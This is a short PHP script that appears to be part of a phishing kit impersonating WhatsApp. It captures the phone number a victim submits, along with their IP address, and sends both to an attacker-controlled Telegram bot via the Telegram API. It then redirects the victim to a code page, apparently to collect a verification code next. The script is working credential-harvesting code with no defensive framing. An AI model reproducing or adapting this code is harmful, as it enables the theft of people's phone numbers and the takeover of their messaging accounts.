<?php

error_reporting(0);
session_start();
include "../../email.php";
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;


$hostname = gethostbyaddr($ip);
$message = "[========== Whatsapp ===========]\r\n";
$message .= "|Phone : ".$_POST['phone']."\r\n";
$message .= "[========= $ip ========]\r\n";


file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );


echo"<script>location.replace('../code.php');</script>";


?>
